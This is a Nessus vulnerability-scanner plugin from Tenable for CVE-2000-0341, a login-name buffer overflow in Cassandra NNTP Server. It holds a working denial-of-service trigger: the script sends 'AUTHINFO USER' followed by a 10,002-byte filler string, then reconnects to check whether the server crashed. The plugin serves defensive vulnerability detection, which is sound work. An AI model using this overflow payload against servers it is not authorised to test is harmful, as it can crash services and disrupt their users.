#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10388);
 script_bugtraq_id(1156);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0341");
 script_xref(name:"OSVDB", value:"1304");
 script_name(english:"Cassandra NNTP Server Login Name Remote Overflow DoS");
 script_summary(english:"Crashes the remote NNTP server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote NNTP server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "A vulnerable version of Cassandra NNTP Server appears to be running\n",
     "on the remote host.  Providing a long argument to the 'AUTHINFO USER'\n",
     "command results in a buffer overflow.  A remote attacker could use\n",
     "this to create a denial of service, or possibly execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/ntbugtraq/2000-q2/0072.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of the software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Denial of Service");
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service_3digits.nasl");
 script_require_ports("Services/nntp", 119);
 
 exit(0);
}

port = get_kb_item("Services/nntp");
if(!port)port = 119;

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = recv(socket:soc, length:8192);
  if("posting allowed" >< r)
  {
    s = string("AUTHINFO USER ", crap(10002), "\r\n");
    send(socket:soc, data:s);
    close(soc);

    soc2 = open_sock_tcp(port);
    r2 = recv(socket:soc2, length:1024);
    if(!r2)
    {
      security_hole(port);
    }
    close(soc2);
  }
}
